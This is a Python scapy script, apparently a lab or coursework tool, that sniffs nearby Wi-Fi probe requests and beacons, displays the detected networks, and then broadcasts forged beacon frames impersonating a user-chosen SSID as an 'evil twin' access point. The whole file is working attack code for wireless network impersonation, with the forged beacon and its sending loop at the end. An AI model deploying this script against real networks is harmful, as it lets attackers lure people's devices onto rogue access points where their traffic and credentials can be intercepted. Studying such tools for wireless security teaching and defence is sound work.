import argparse
import pandas as pandas
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11, Dot11Elt, RadioTap, Dot11Beacon

probes = pandas.DataFrame(columns=["SSID", "source MAC", "Channel"])
# set the index SSID (Name of the AP)
probes.set_index("SSID", inplace=True)

networks = pandas.DataFrame(columns=["SSID", "BSSID", "Signal (dBm)", "Channel"])
# set the index SSID (Name of the AP)
networks.set_index("SSID", inplace=True)


def callback(packet):
    # if the packet is a probe request
    if packet.haslayer(Dot11ProbeReq):
        # get the SSID in the Probe Request
        ssid = packet[Dot11Elt].info.decode()
        if ssid == "":
            ssid = "<empty>"
        # source address of the device searching for network
        source_mac = packet[Dot11].addr2
        # extract network stats
        stats = packet[Dot11ProbeReq].network_stats()
        # get the channel where the AP is requested
        channel_in_probe = stats.get("channel")
        probes.loc[ssid] = (source_mac, channel_in_probe)

    # else if the packet is a beacon
    elif packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr3
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        networks.loc[ssid] = (bssid, dbm_signal, channel)


def print_all(stop):
    while True:
        os.system("clear")
        print("Probe Requests detected")
        print(probes)
        print("\nNetworks detected")
        print(networks)
        print(f"Sniffing will end after {sniff_time} seconds...")
        time.sleep(0.5)

        if stop():
            break


def change_channel(stop):
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

        if stop():
            break


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="A python script for detecting probe requests and creating evil twin "
                                                 "of chosen SSID if it is available in the area")
    parser.add_argument("bssid", help="BSSID of the evil twin network")
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                        default="wlan0")
    parser.add_argument("-s", dest="sniff_time", help="Sniffing time (in seconds) to scan for probe requests and "
                                                      "networks, default is 20s", default=20)
    parser.add_argument("-c", "--count", help="Number of beacons to send, specify 0 to keep sending "
                                              "infinitely, default is 0", default=0)
    parser.add_argument("--interval",
                        help="The sending frequency (in seconds) between two frames sent, default is 0.1s",
                        default=0.1)

    args = parser.parse_args()

    entered_bssid = args.bssid
    interface = args.iface
    sniff_time = int(args.sniff_time)
    count = int(args.count)
    interval = float(args.interval)

    stop_threads = False
    # start the thread that prints the SSID coming from the probe requests and the detected networks
    printer = Thread(target=print_all, args=(lambda: stop_threads,))
    printer.daemon = True
    printer.start()

    # start sniffing
    sniff(prn=callback, iface=interface, timeout=sniff_time)

    # stop thread used for printing found SSID and detected networks
    stop_threads = True
    printer.join()

    if probes.empty or networks.empty:
        print("No probe requests or networks detected")
    else:
        chosen_ssid = input("Please choose a network to impersonate by entering its SSID (it must be available in the "
                            "area !) : ")

        # if the chosen SSID is not detected in the area
        if chosen_ssid not in networks.index:
            print(f"Network {chosen_ssid} not found in the area")
        else:
            (bssid, dbm_signal, channel) = networks.loc[chosen_ssid]

            # choose a channel 6 channels away from the original network
            channel = (channel + 6) % 14

            # forging a beacon with type 0 and subtype 8 (Management frame and Beacon), broadcast address as
            # destination address, BSSID in argument as the sender address and AP address
            packet = RadioTap() \
                     / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=entered_bssid, addr3=entered_bssid) \
                     / Dot11Beacon(cap="ESS+privacy") \
                     / Dot11Elt(ID="SSID", info=chosen_ssid, len=len(chosen_ssid)) \
                     / Dot11Elt(ID="DSset", info=chr(channel))

            # if count is 0, it means we loop forever (until interrupt)
            if count == 0:
                loop = 1
                count = None
                print(
                    f"\n[+] Sending beacons of network {chosen_ssid}({entered_bssid}) on channel {channel} "
                    f"every {interval}s forever...")
            else:
                loop = 0
                print(
                    f"\n[+] Sending {count} beacons of network {chosen_ssid}({entered_bssid}) on channel {channel} "
                    f"every {interval}s...")

            # sending beacons
            sendp(packet, inter=interval, count=count, loop=loop, iface=interface, verbose=1)
